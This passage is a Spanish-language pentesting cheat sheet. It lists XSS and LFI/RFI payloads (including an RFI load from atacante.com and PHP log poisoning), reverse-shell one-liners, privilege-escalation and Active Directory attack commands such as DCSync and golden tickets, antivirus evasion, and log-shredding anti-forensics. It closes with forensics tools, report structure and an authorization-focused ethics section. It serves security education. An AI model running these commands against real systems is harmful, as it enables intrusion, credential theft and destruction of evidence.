# Herramientas principales:
# Proxy     → Interceptar y modificar peticiones
# Repeater  → Reenviar peticiones manualmente
# Intruder  → Fuzzing y brute force
# Scanner   → Escaneo automático de vulnerabilidades (Pro)
# Decoder   → Encode/decode Base64, URL, HTML, etc.
# Comparer  → Comparar dos peticiones
# Sequencer → Analizar aleatoriedad de tokens
```

### XSS — Cross-Site Scripting
```bash
# Payloads básicos de XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')">
"><script>alert('XSS')</script>
';alert('XSS');//

# XSStrike — Scanner de XSS
xsstrike -u "http://dominio.com/search?q=test"
xsstrike -u "http://dominio.com/search?q=test" --crawl
```

### LFI/RFI — File Inclusion
```bash
# Payloads LFI
http://dominio.com/page?file=../../../etc/passwd
http://dominio.com/page?file=../../../etc/shadow
http://dominio.com/page?file=../../../etc/hosts
http://dominio.com/page?file=/proc/self/environ
http://dominio.com/page?file=php://filter/convert.base64-encode/resource=config.php

# Log poisoning via LFI
# Contaminar log y luego incluirlo
curl http://dominio.com/ -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
http://dominio.com/page?file=/var/log/apache2/access.log&cmd=id

# RFI
http://dominio.com/page?file=http://atacante.com/shell.php
```

### OWASP Top 10 (Resumen)
```
A01 - Broken Access Control         → IDOR, bypass de autorización
A02 - Cryptographic Failures        → Datos sensibles sin cifrar, algoritmos débiles
A03 - Injection                     → SQLi, Command injection, LDAP injection
A04 - Insecure Design               → Falta de controles desde el diseño
A05 - Security Misconfiguration     → Defaults, directorios expuestos, verbose errors
A06 - Vulnerable Components         → Dependencias desactualizadas
A07 - Authentication Failures       → Brute force, tokens débiles, no MFA
A08 - Software Integrity Failures   → Dependencias sin verificar, CI/CD inseguro
A09 - Logging Failures              → Sin logs, sin alertas
A10 - SSRF                          → Solicitudes forjadas al servidor interno
```

---

## 13. Post-Explotación

### Escalada de privilegios Linux
```bash
# Enumeración básica
id
whoami
sudo -l                                                  # Comandos sudo permitidos
cat /etc/passwd
cat /etc/shadow                                          # Si tienes permisos
uname -a                                                 # Versión del kernel
cat /etc/os-release
ps aux                                                   # Procesos
netstat -tulpn                                           # Puertos abiertos
env                                                      # Variables de entorno
find / -perm -4000 -type f 2>/dev/null                   # SUID bits

# LinPEAS — Enumeración automática
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a 2>&1 | tee linpeas_output.txt

# LinEnum
./LinEnum.sh -s -r reporte -e /tmp/ -t

# Técnicas comunes de escalada
# SUID binaries
find / -perm -4000 2>/dev/null
# https://gtfobins.github.io → buscar binario con SUID

# Cron jobs mal configurados
cat /etc/crontab
ls /etc/cron.*
crontab -l
find / -name "*.sh" -writable 2>/dev/null               # Scripts editables en cron

# PATH hijacking
echo $PATH
# Si hay rutas editables antes de las del sistema en PATH

# Capabilities
getcap -r / 2>/dev/null

# Sudo con NOPASSWD
sudo -l
sudo vim -c ':!/bin/bash'                               # Si vim en sudo
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# Kernel exploits
uname -r
searchsploit linux kernel $(uname -r)
```

### Escalada de privilegios Windows
```bash
# Enumeración
whoami
whoami /priv                                             # Privilegios del usuario
net user                                                 # Usuarios locales
net localgroup administrators                            # Admins
systeminfo                                               # Info del sistema
wmic qfe list brief                                      # Parches instalados
tasklist                                                 # Procesos corriendo

# WinPEAS
.\winPEASx64.exe
.\winPEASx64.exe systeminfo userinfo

# PowerSploit / PowerView
Import-Module .\PowerView.ps1
Get-NetUser
Get-NetGroup
Invoke-AllChecks                                         # PowerUp: buscar privesc

# Técnicas comunes
# AlwaysInstallElevated
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

# Servicios con permisos débiles
sc qc NombreServicio
accesschk.exe -ucqv NombreServicio
icacls "C:\ruta\servicio.exe"

# Token impersonation (SeImpersonatePrivilege)
# JuicyPotato, PrintSpoofer, RoguePotato
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
.\PrintSpoofer.exe -i -c cmd

# Pass the Hash
crackmapexec smb 192.168.1.1 -u admin -H NTLM_HASH
```

### Shells y TTY
```bash
# Reverse shells (en el atacante: nc -lvnp 4444)
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("192.168.1.100",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
nc 192.168.1.100 4444 -e /bin/bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444)..."

# Listeners
nc -lvnp 4444                                           # Netcat
rlwrap nc -lvnp 4444                                    # Con historial
socat TCP-L:4444 FILE:`tty`,raw,echo=0                  # TTY completa desde listener

# Mejorar shell (TTY completa)
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → bg la shell
stty raw -echo; fg
export TERM=xterm
stty rows 50 columns 200
```

---

## 14. Active Directory (Entornos Windows Corporativos)
```bash
# BloodHound — Mapear AD y encontrar rutas de ataque
neo4j start                                             # Iniciar base de datos
bloodhound                                              # Iniciar GUI

# Recolectar datos con SharpHound (en el objetivo)
.\SharpHound.exe -c All
.\SharpHound.exe -c DCOnly                              # Solo el Domain Controller

# Recolectar desde Kali con bloodhound-python
bloodhound-python -u usuario -p contraseña -d dominio.local -c All --zip

# Kerberoasting — Obtener TGS de cuentas de servicio
impacket-GetUserSPNs -request -dc-ip 192.168.1.10 dominio.local/usuario:contraseña
hashcat -m 13100 kerberos_hashes.txt rockyou.txt

# AS-REP Roasting — Cuentas sin pre-autenticación Kerberos
impacket-GetNPUsers dominio.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.10
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# Pass the Hash
impacket-psexec -hashes ':NTLM_HASH' admin@192.168.1.10
impacket-wmiexec -hashes ':NTLM_HASH' admin@192.168.1.10

# DCSync — Obtener hashes del Domain Controller
impacket-secretsdump -just-dc DOMINIO/admin:pass@192.168.1.10
mimikatz# lsadump::dcsync /user:krbtgt                 # En Windows

# Golden Ticket
mimikatz# kerberos::golden /user:admin /domain:dominio.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt

# Pass the Ticket
mimikatz# kerberos::ptt ticket.kirbi

# Impacket Tools
impacket-smbclient //192.168.1.10/share -U admin
impacket-smbexec dominio/admin:pass@192.168.1.10
impacket-dcomexec dominio/admin:pass@192.168.1.10
impacket-atexec dominio/admin:pass@192.168.1.10 "whoami"
```

---

## 15. Análisis Forense Digital

### Autopsy
```bash
autopsy                                                 # Iniciar GUI web (puerto 9999)
# Análisis de imágenes de disco, recuperación de archivos, timeline
```

### Volatility — Análisis de memoria RAM
```bash
# Volatility 3
vol -f memory.dmp windows.info
vol -f memory.dmp windows.pslist                        # Lista de procesos
vol -f memory.dmp windows.pstree                        # Árbol de procesos
vol -f memory.dmp windows.cmdline                       # Comandos ejecutados
vol -f memory.dmp windows.netscan                       # Conexiones de red
vol -f memory.dmp windows.filescan                      # Archivos en memoria
vol -f memory.dmp windows.dumpfiles --virtaddr 0xXXX    # Extraer archivo
vol -f memory.dmp windows.hashdump                      # Hashes de contraseñas
vol -f memory.dmp windows.malfind                       # Código inyectado sospechoso
vol -f memory.dmp linux.bash                            # Historial bash (Linux)

# Volatility 2
volatility -f memory.dmp imageinfo                      # Identificar perfil
volatility -f memory.dmp --profile=Win10x64 pslist
```

### Extracción de datos y artefactos
```bash
# Imágenes de disco
dd if=/dev/sda of=disco.img bs=4M status=progress       # Clonar disco
dcfldd if=/dev/sda of=disco.img hash=md5 hashwindow=1M  # Con hash de verificación
fdisk -l disco.img                                       # Ver particiones

# Montaje de imágenes
mount -o loop,ro,offset=1048576 disco.img /mnt/forense
losetup -f disco.img
kpartx -av disco.img

# Recuperación de archivos
foremost -t all -i disco.img -o /output/                # Recuperar por firma
scalpel disco.img -o /output/                           # Recuperar por cabeceras
testdisk disco.img                                       # Recuperar particiones/archivos
photorec disco.img                                       # Recuperar fotos y archivos

# Strings y análisis
strings archivo_sospechoso | grep -E "(http|password|user)"
binwalk archivo_sospechoso                               # Archivos embebidos
binwalk -e archivo_sospechoso                            # Extraer archivos embebidos
file archivo_desconocido                                 # Identificar tipo
hexdump -C archivo | head -20                            # Ver cabecera hex
xxd archivo | head                                       # Alternativa hexdump
```

### Análisis de red forense
```bash
# Wireshark (análisis de capturas)
tshark -r captura.pcap -Y "http.request"
tshark -r captura.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport | sort | uniq -c | sort -rn
tshark -r captura.pcap --export-objects http,/output/   # Extraer objetos HTTP

# NetworkMiner (GUI)
networkminer
```

---

## 16. Generación de Reportes

### Herramientas de documentación
```bash
# Dradis — Plataforma de reporte colaborativo
dradis

# Faraday — IDE de seguridad con reportes
faraday-client

# Serpico — Reportes de penetration testing
# Pipal — Análisis de contraseñas crackeadas
pipal wordlist_crackeada.txt

# Cherrytree — Notas estructuradas (muy usado por pentesters)
cherrytree

# Exportar resultados Nmap a HTML
xsltproc /usr/share/nmap/nmap.xsl nmap_resultado.xml -o reporte.html
```

### Estructura de reporte profesional
```
1. RESUMEN EJECUTIVO
   - Alcance del trabajo
   - Fechas de la evaluación
   - Resumen de hallazgos (críticos/altos/medios/bajos)
   - Recomendaciones prioritarias

2. METODOLOGÍA
   - Fases ejecutadas
   - Herramientas utilizadas
   - Limitaciones

3. HALLAZGOS
   Por cada vulnerabilidad:
   - Título y clasificación (CVSS)
   - Descripción técnica
   - Evidencia (capturas de pantalla, logs)
   - Impacto empresarial
   - Recomendación de remediación
   - Referencias (CVE, OWASP)

4. APÉNDICES
   - Listado de hosts/IPs evaluados
   - Credenciales comprometidas (hasheadas)
   - Herramientas usadas
```

---

## 17. Evasión y Anti-Forense

### Evasión de antivirus
```bash
# Veil Framework — Payloads que evaden AV
veil
# Evasion → Seleccionar payload → generar

# Shellter — Inyectar payload en PE legítimo
shellter -a -f /usr/share/windows-binaries/plink.exe    # Auto mode

# Invoke-Obfuscation — Ofuscación de PowerShell
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
TOKEN\ALL\1

# Técnicas manuales
msfvenom ... --encoder x86/shikata_ga_nai -i 10         # Múltiples iteraciones de encoding
# XOR encoding personalizado
# Payload en memoria (no tocar disco)
# Process hollowing
# Reflective DLL injection
```

### Herramientas de anonimato
```bash
# Tor
service tor start
proxychains nmap -sT -Pn 192.168.1.1                    # Usar via proxychains
proxychains firefox &                                    # Navegación via Tor

# Proxychains configuración
cat /etc/proxychains4.conf
# Agregar: socks5 127.0.0.1 9050

# Cambiar MAC
macchanger -r eth0                                       # MAC aleatoria
macchanger -m AA:BB:CC:DD:EE:FF eth0                    # MAC específica
macchanger -s eth0                                       # Ver MAC actual

# Limpiar rastros
history -c                                              # Limpiar historial bash
echo "" > ~/.bash_history
shred -zuv /var/log/auth.log                            # Destruir log
find / -name "*.log" -exec shred -zuv {} \; 2>/dev/null
```

---

## 18. Herramientas Adicionales Importantes

### Netcat — La navaja suiza
```bash
nc -lvnp 4444                                           # Listener TCP
nc 192.168.1.1 4444                                     # Conectar
nc -lvnp 4444 > archivo_recibido.txt                    # Recibir archivo
nc 192.168.1.1 4444 < archivo_enviar.txt                # Enviar archivo
nc -z 192.168.1.1 1-1000                                # Port scan
nc -u 192.168.1.1 53                                    # UDP
```

### Socat
```bash
socat TCP-LISTEN:4444,fork TCP:192.168.1.1:4444         # Port forward
socat FILE:`tty`,raw,echo=0 TCP-LISTEN:4444             # TTY completa listener
socat TCP:192.168.1.100:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
socat TCP-LISTEN:443,fork,reuseaddr OPENSSL-LISTEN:4444 # SSL wrapping
```

### Impacket Suite
```bash
impacket-psexec usuario:contraseña@192.168.1.1          # Ejecución remota
impacket-smbclient //192.168.1.1/share                  # Cliente SMB
impacket-secretsdump usuario:contraseña@192.168.1.1     # Volcar secretos
impacket-GetUserSPNs                                    # Kerberoasting
impacket-GetNPUsers                                     # AS-REP Roasting
impacket-ntlmrelayx                                     # NTLM relay attacks
impacket-smbserver share /ruta/local                    # Levantar servidor SMB
```

### CrackMapExec (CME) / NetExec
```bash
crackmapexec smb 192.168.1.0/24                         # Descubrir SMB
crackmapexec smb 192.168.1.1 -u usuario -p pass -x "whoami"  # Ejecutar comando
crackmapexec smb 192.168.1.1 -u usuario -p pass --mimikatz
crackmapexec winrm 192.168.1.1 -u usuario -p pass       # WinRM
crackmapexec ssh 192.168.1.0/24 -u usuario -p pass      # SSH en red
crackmapexec ldap 192.168.1.10 -u usuario -p pass --users  # LDAP
```

### Empire / PowerShell Empire
```bash
# Framework de post-explotación PowerShell
sudo powershell-empire server
sudo powershell-empire client
# (uselistener, usestager, usemodule)
```

### Covenant (C2 .NET)
Framework C2 moderno con interfaz web para post-explotación en Windows.

### Chisel — Tunneling
```bash
# En Kali (servidor)
chisel server -p 8080 --reverse

# En objetivo (cliente)
chisel client 192.168.1.100:8080 R:socks          # SOCKS reverso
chisel client 192.168.1.100:8080 R:9090:127.0.0.1:80  # Port forward reverso
```

---

## 19. Tabla de Referencia Rápida

| Herramienta | Categoría | Uso principal |
|------------|-----------|--------------|
| `nmap` | Escaneo | Descubrimiento de puertos, servicios, OS |
| `masscan` | Escaneo | Escaneo masivo ultra-rápido |
| `metasploit` | Explotación | Framework de exploits y post-explotación |
| `msfvenom` | Payloads | Generación de payloads personalizados |
| `burpsuite` | Web | Proxy interceptor y scanner web |
| `sqlmap` | Web | Inyección SQL automatizada |
| `hydra` | Contraseñas | Brute force de servicios online |
| `hashcat` | Contraseñas | Cracking offline con GPU |
| `john` | Contraseñas | Cracking de hashes |
| `aircrack-ng` | WiFi | Auditoría de redes inalámbricas |
| `wireshark` | Sniffing | Análisis de tráfico de red |
| `nikto` | Web | Scanner de vulnerabilidades HTTP |
| `gobuster` | Web | Fuerza bruta de directorios |
| `theHarvester` | OSINT | Recolección de información |
| `enum4linux` | Enumeración | Enumeración de SMB/Samba |
| `responder` | Red | Captura de hashes NTLM |
| `bloodhound` | AD | Análisis visual de Active Directory |
| `impacket` | AD/SMB | Suite de protocolos Windows |
| `volatility` | Forense | Análisis de memoria RAM |
| `autopsy` | Forense | Análisis forense de discos |
| `searchsploit` | Vulnerabilidades | Búsqueda de exploits offline |
| `crackmapexec` | AD/SMB | Movimiento lateral y auditoría |
| `linpeas` | PrivEsc | Enumeración automática Linux |
| `winpeas` | PrivEsc | Enumeración automática Windows |

---

## 20. Puertos y Servicios Comunes

| Puerto | Protocolo | Servicio |
|--------|-----------|---------|
| 21 | TCP | FTP |
| 22 | TCP | SSH |
| 23 | TCP | Telnet |
| 25 | TCP | SMTP |
| 53 | TCP/UDP | DNS |
| 80 | TCP | HTTP |
| 88 | TCP/UDP | Kerberos |
| 110 | TCP | POP3 |
| 135 | TCP | RPC |
| 139 | TCP | NetBIOS |
| 143 | TCP | IMAP |
| 161 | UDP | SNMP |
| 389 | TCP | LDAP |
| 443 | TCP | HTTPS |
| 445 | TCP | SMB |
| 512-514 | TCP | R-services |
| 1433 | TCP | MSSQL |
| 1521 | TCP | Oracle DB |
| 3306 | TCP | MySQL |
| 3389 | TCP | RDP |
| 4444 | TCP | Metasploit (default) |
| 5432 | TCP | PostgreSQL |
| 5985 | TCP | WinRM HTTP |
| 5986 | TCP | WinRM HTTPS |
| 6379 | TCP | Redis |
| 8080 | TCP | HTTP alternativo |
| 8443 | TCP | HTTPS alternativo |
| 27017 | TCP | MongoDB |

---

## 21. Consideraciones Legales y Éticas
```
✅ SIEMPRE obtener autorización escrita (Rules of Engagement / Contrato)
✅ Definir alcance claro: IPs, dominios, horarios permitidos
✅ Respetar sistemas fuera del alcance acordado
✅ Documentar TODAS las acciones realizadas
✅ Reportar vulnerabilidades críticas inmediatamente al cliente
✅ Proteger los datos obtenidos durante la prueba
✅ Eliminar accesos y backdoors al finalizar

❌ NUNCA atacar sistemas sin autorización expresa
❌ NUNCA exfiltrar datos reales del cliente fuera del entorno de prueba
❌ NUNCA causar daño o interrupción no autorizada de servicios
❌ NUNCA usar herramientas en redes que no sean tuyas o de tu cliente

Marcos legales de referencia:
- Computer Fraud and Abuse Act (CFAA) — EE.UU.
- Ley 1273 de 2009 — Colombia (delitos informáticos)
- Directiva NIS2 — Unión Europea
- ISO/IEC 27001 — Gestión de seguridad de la información
- PTES — Penetration Testing Execution Standard
- OWASP Testing Guide — Metodología para aplicaciones web
- NIST SP 800-115 — Guía técnica de pruebas de seguridad
```
